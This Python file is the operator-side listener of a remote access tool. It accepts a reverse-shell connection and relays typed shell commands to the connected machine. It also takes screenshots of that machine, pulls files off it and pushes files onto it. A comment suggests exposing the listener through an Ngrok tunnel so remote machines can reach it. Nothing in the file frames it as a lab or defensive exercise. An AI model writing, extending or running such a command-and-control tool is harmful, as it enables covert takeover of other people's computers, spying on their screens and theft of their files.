import socket
import subprocess
import os
from pathlib import Path
from tkinter import filedialog as fd
import time

def start_listener(host, port):
	global client_socket
	listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	listener.bind((host, port))
	listener.listen(1)
	print(f"🔊 [*] Listening on {host}:{port}")

	client_socket, addr = listener.accept()
	print(f"🤝 [*] Received connection from {addr[0]}:{addr[1]}")

	while True:
		command = input("💻 Shell> ")

		if command.lower() == "exit":
			break
		
		elif command == "":
			pass
		elif command == "cls" or command=="clear":
			os.system("cls||clear")
		elif command.lower() == "screenshot":
			client_socket.send(command.encode())
			receive_screenshot(client_socket)
		elif command[:8].lower() == "download":
			client_socket.send(command.encode())
			download_file(command[9:])
		elif command[:6].lower()=="upload":
			client_socket.send(command.encode())
			upload_file(command[7:])
		elif command.lower().startswith("cd "):
			client_socket.send(command.encode())
			response = client_socket.recv(4096).decode()
			if response == "DIR_NOT_FOUND":
				print("[!] Directory Not Found")
		else:
			client_socket.send(command.encode())
			response = client_socket.recv(4096).decode()
			print(response)

	client_socket.close()
	listener.close()


def receive_screenshot(client_socket):
    screenshot_data = b""
    while True:
        data = client_socket.recv(4096)
        if data == b"DONE":
            break
        screenshot_data += data

    with open("screenshot.jpg", "wb") as file:
        file.write(screenshot_data)

    print("[*] 🖼️ Screenshot received and saved as 'screenshot.jpg'")


def download_file(file_name):
			data = client_socket.recv(1024)
			if data.decode() == "FILE_NOT_FOUND":
				print("[!] File Not Found On Remote Machine")
				return
			f = open(file_name, "wb")
			client_socket.settimeout(1)
			chunk = client_socket.recv(1024)
			while chunk:
				f.write(chunk)
				try:
					chunk = client_socket.recv(1024)
				except socket.timeout as e:
					print(f"[*] 📥 File '{file_name}' downloaded successfully")
					break
			client_socket.settimeout(None)
			f.close()

def upload_file(file_name):
			file_name = fd.askopenfilenames()
			if len(file_name) == 0:
				print("[!] No File Selected")
				client_socket.send(b"FILE_NOT_CHOSE")
				return
			client_socket.send(B"ok")
			client_socket.send(str(len(list(file_name))).encode())
			for _file in list(file_name):
				f = open(_file, "rb")
				print(f"[*] ☁️ File '{_file}' uploaded successfully")
				time.sleep(3)
				client_socket.send((Path(_file).name).encode())
				client_socket.send(f.read())
				f.close()

if __name__ == "__main__":
	host = "localhost"  # Replace with your Ngrok tunnel URL
	port = 1234  # Choose a port number
	start_listener(host, port)
